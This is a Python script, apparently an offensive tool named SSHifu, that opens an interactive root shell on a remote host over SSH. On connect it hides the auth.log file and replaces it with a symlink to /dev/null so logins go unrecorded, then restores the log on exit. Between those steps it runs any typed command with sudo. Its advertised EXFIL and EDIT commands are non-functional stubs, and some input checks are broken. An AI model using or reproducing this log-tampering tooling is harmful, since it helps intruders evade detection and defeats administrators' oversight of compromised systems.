#!/usr/bin/python3
import os
import subprocess
import sys
import socket

'''
program structure
1. Startup Program
2. Obfuscating location
3. Interactive session
    A. extra interactive commands
4. Quiting
'''

def startup():
    if len(sys.argv) < 1:
        print("ERROR: Not enough strings\n\tpython3 SSHifu.py [username]@[ip address]")
    userinput = str(sys.argv[1])
    username, ipaddress = userinput.split("@")

    
    try:
        socket.inet_aton(ipaddress)
        return username,ipaddress
    except socket.error:
        print("ERROR: Not a valid ip address\n")
        exit(1)
def obfuscate(username,ipaddress):
    os.system(f" ssh -t {username}@{ipaddress} \"sudo -- sh -c \'mv /var/log/auth.log /var/log/.oldlog\'\"")
    os.system(f" ssh -t {username}@{ipaddress}  \"sudo -- sh -c \'ln -s /dev/null /var/log/auth.log \'\"")
def env(username, ipaddress):
    pwd = subprocess.check_output(f" ssh -t {username}@{ipaddress} pwd", shell=True)
    pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
    pwd = str(pwd.strip("[\'"))
    hostname = subprocess.check_output(f" ssh -t {username}@{ipaddress} hostname", shell=True)
    hostname = str(hostname.decode("utf-8").split("'")).rstrip("\\n']")
    hostname = str(hostname.strip("[\'"))
    account = subprocess.check_output(f" ssh -t {username}@{ipaddress} whoami", shell=True)
    account = str(account.decode("utf-8").split("'")).rstrip("\\n']")
    account = str(account.strip("[\'"))
    return pwd, hostname, account
def printhelp():
    output = """Available Commands:\n
    HELP: Display the help page with a list of available commands\n
    EXFIL: Exfiltrate a target file/folder
    EDIT: Edit a file
    """
    print(output)
    
def interactive(username, ipaddress):
    print("in interactive\n")
    pwd, hostname, account = env(username,ipaddress)
    while True:
        string = input(username + "@"+hostname+":"+pwd + "> ")
        if string == "HELP":
            printhelp()
        if string == "EXFIL":
            print("Exfilling target data\n")
            print(len(string))
            if len(string) == 5:
                print("Syntax error:\n\t EXFIL [target]")
        if string == "EDIT":
            print("Editing target file\n")
            if len(string) == 4:
                print("Syntax error:\n\t EDIT [target]")
        if string == "EXIT":
            print("exiting session\nGoodbye..")
            os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c \'rm -rf /var/log/auth.log \'\"")
            os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c \'mv /var/log/.oldlog /var/log/auth.log \'\"")
            exit()
        string = string.replace('\"', "\"")
        os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c ' {string}'\"")
        pwd = subprocess.check_output(f" ssh -t {username}@{ipaddress} pwd", shell=True)
        pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
        pwd = str(pwd.strip("[\'"))  


    
if __name__ == "__main__":
    username, ipaddress = startup()
    print(f"Username is {username} and address is {ipaddress}\n")
    obfuscate(username, ipaddress)
    interactive(username, ipaddress)
    
    
